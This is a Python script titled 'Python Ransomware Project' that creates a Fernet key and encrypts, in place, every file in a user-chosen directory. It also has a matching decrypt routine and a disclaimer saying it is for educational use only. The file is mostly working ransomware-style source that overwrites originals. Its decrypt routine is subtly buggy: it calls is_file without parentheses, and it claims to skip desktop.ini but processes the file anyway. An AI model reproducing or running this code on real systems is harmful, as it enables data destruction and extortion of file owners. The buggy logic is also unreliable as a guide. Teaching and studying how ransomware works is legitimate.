import os #to interact with file system
import ctypes #windows api features
from cryptography.fernet import Fernet #key generation and encryption
def keygen():
    key = Fernet.generate_key() #generates fernet key

    with open('encryptionkey.key', 'wb') as file:
        file.write(key) #writes fernet key to file
def file_list(directory):
    files = os.scandir(directory)
    #for testing, just list names of the files
    print("The following files are in this directory: ")
    for entry in files:
        if entry.is_file():
            print(entry.name)
def encrypt(directory):
    print("This will ENCRYPT the files listed above, potentially causing file loss. Are you sure you wish to continue?")
    option = input("Select (y/n): ")
    with open('encryptionkey.key', 'rb') as key:
        encrypt = key.read().strip()
        fernet = Fernet(encrypt)
    match option:
        case 'y':
            print("Encrypting...")
            #grab all files from a directory and encrypt. 
            files= os.scandir(directory)
            for entry in files:
                if entry.is_file:
                    if entry.name == "desktop.ini":
                        print("Desktop.ini detected, skipping file...")
                    else:
                        with open(entry, 'rb') as f:
                            data = f.read()
                            encrypted_file = fernet.encrypt(data)
                        with open(entry, 'wb') as ef:
                            ef.write(encrypted_file)
            print("Encryption complete.")
        case 'n':
            print("Encryption Cancelled.")

#maybe make the decryptor a separate program?
def decrypt(directory):
    #finds key.txt
    with open('encryptionkey.key', 'rb') as decrypt:
        key = decrypt.read().strip()
        fernet = Fernet(key)

    files = os.scandir(directory)
    for entry in files:
        if entry.is_file:
            if entry.name == "desktop.ini":
                print("Desktop.ini detected, skipping file...")
            with open(entry, 'rb') as f:
                data = f.read()
            decrypted = fernet.decrypt(data)
            with open(entry, 'wb' ) as f:
                f.write(decrypted)
            

#for cmd line, make a selection menu? 
print("Python Ransomware Project")
print("DISCLAIMER: This project has been created for EDUCATIONAL PURPOSES ONLY. The creator has only intended this program to be ran in a virtual environment by students and professionals. They are not responsible for any file loss or damages done by this program. If used for illegal purposes the original repository WILL be taken down.")
print("Please select a menu option:")
print("1. Encrypt directory \n2. Decrypt Directory \n3. Scan files (testing only)")
option = input("Selection: ")

match option:
    case '1': #encryption case
        keygen() #generates key for encryption
        print("please select a directory: ")
        path = input("directory: ")
        file_list(path)
        encrypt(path)
    case '2': #decryption case
        path=input("directory: ")
        decrypt(path)
    case '3': #list files
        path = input( "directory: ")
        file_list(path)

